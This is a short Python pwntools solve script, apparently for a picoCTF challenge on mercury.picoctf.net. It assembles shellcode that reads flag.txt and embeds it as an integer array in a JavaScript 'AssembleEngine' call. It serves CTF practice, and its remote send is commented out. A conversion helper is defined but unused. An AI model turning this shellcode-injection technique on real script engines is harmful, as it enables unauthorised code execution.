
""" Post Mortem

    - Slow down, try to understand what is happening, and the hints/help they are giving
    - Learn more about these ctypes, they OP
    """

from pwn import *
from ctypes import *

context.arch = 'amd64'

HOST = 'mercury.picoctf.net'
PORT = 60514

def itof(double):
  cp = pointer(c_long(double))
  fp = cast(cp, POINTER(c_double))

  return fp.contents.value

def send_script(script):
  proc = remote(HOST, PORT)
  proc.sendlineafter(b'Provide size. Must be < 5k:', str(len(script)).encode())
  proc.sendlineafter(b'Provide script please!!', script.encode())

  return proc

def main():
  shellcode = shellcraft.amd64.linux.cat('flag.txt')
  shellcode = asm(shellcode)

  arr = []
  for i in range(0, len(shellcode), 8):
    eight_bytes = shellcode[i:i+8]
    double = int.from_bytes(eight_bytes, 'little')
    arr.append(double)
  
  js_script = f'AssembleEngine({arr})'

  print(js_script)

  #proc = send_script(js_script)
  #proc.interactive()

if __name__ == '__main__':
  main()
